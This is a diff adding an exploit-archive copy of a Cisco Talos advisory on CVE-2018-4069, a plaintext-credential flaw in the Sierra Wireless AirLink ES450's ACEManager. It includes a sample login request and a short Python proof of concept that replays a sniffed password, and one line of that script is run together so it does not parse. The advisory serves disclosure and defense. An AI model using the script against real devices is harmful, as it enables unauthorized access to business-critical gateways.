@@ -1,0 +1,111 @@
+id: 32613
+date: 04/29/2019
+title: Sierra Wireless AirLink ES450 ACEManager Information Exposure Exploit
+author: Cisco Talos
+cves: CVE-2018-4069
+
+Sierra Wireless AirLink ES450 ACEManager Information Exposure Vulnerability
+
+CVE Number
+
+CVE-2018-4069
+
+Summary
+
+An information disclosure vulnerability exists in the ACEManager authentication functionality of Sierra Wireless AirLink ES450 FW 4.9.3. The ACEManager authentication functionality is done in plaintext XML to the web server. An attacker can listen to network traffic upstream from the device to capitalize on this vulnerability.
+
+Tested Versions
+
+Sierra Wireless AirLink ES450 FW 4.9.3
+
+Product URLs
+
+https://www.sierrawireless.com/products-and-solutions/routers-gateways/es450/
+CVSSv3 Score
+
+5.9 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
+CWE
+
+CWE-311: Missing Encryption of Sensitive Data
+
+Details
+
+Sierra Wireless is a wireless communications equipement designer and manufacturer. They provide both embedded solutions as well as wireless hardware solutions, including both the ES450 and GX450 devices. The AirLink ES450 is a LTE gateway designed for distributed enterprise. The ES450 is typically seen connecting Point-of-sale devices, remote SCADA equipment, or other business critical equipment. The AirLink ES450 also provides a terminal server for remote out-of-band administration.
+
+ACEManager is the web server included with the AirLink ES450. This web server is responsible for the majority of interactions in the device. Some specific capabilities of the web server are routing, device reconfiguration, user authentication and certificate management. The vendor has stated that the ACEManager web application is not accessible by default from the Cellular WAN.
+
+The authentication of ACEManager utilizes plaintext credentials for communication between the client and webserver. This plaintext authentication can be sniffed from the network and utilized to log into the device.
+Authentication Request
+
+ POST /xml/Connect.xml HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+ Accept: application/xml, text/xml, */*; q=0.01
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/
+ Content-Type: text/xml
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 129
+ Cookie: token=1774ad8f3ee180cdd62e29611e1efc9c
+ Connection: close
+
+ <request xmlns="urn:acemanager">
+ <connect>
+ <login>user</login>
+ <password><![CDATA[password012]]></password>
+ </connect>
+ </request>
+
+These vulnerabilities were discovered and tested using the AirLink ES450. Most likely this vulnerabilities also affects the AirLink GX450 product as well.
+
+Exploit Proof of Concept
+
+ #!/usr/bin/env python
+ #Author : Carl Hurd, Cisco Talos
+ import sys
+ import requests
+
+ from requests_toolbelt.utils import dump
+
+ def auth(ip, port, password):
+      data = """<request xmlns="urn:acemanager">
+      <connect>
+      <login>user</login>
+      <password><![CDATA[{}]]></password>
+      </connect>
+      </request>""".format(password)
+
+      response = requests.post("http://"+ip+":"+port+"/xml/Connect.xml", data=data)
+
+      data = dump.dump_all(response) print(data.decode('utf-8'))
+
+ def main():
+      if len(sys.argv) < 4 or len(sys.argv) > 4:
+           print("Usage : {} [ip address] [port] [password of user]".format(sys.argv[0]))
+           sys.exit(0)
+
+      ip = sys.argv[1]
+      port = sys.argv[2]
+      password = sys.argv[3]
+
+      auth(ip, port, password)
+
+
+ if __name__ == "__main__":
+      main()
+
+Timeline
+
+2018-12-14 - Vendor disclosure
+2018-12-17 - Vendor acknowledged
+2019-01-08 - Discussion to review vendor's analysis of issues
+2019-03-26 - Vendor established timelines for fix/public disclosure
+2019-04-20 - Talos provided revised CVSS score on TALOS-2018-0746, TALOS-2018-0751, TALOS-2018-0752, TALOS-2018-0755, and TALOS-2018-0756
+2019-04-25 - Public Release
+
+Credit
+
+Discovered by Carl Hurd of Cisco Talos.
+
+#  0day.today [2023-03-23]  #
